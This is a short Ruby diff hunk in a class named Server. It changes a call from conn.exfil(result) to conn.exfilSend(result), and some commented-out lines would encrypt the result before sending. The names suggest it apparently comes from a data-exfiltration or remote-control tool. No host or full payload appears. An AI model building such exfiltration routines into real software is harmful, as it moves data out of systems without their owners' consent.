@@ -47,7 +47,7 @@ class Server
         #iv = dec.newIv
         #payload = dec.encrypt(iv,result)
         #conn.exfilSend(payload)
-        conn.exfil(result)
+        conn.exfilSend(result)
       end
       str = ""
     end
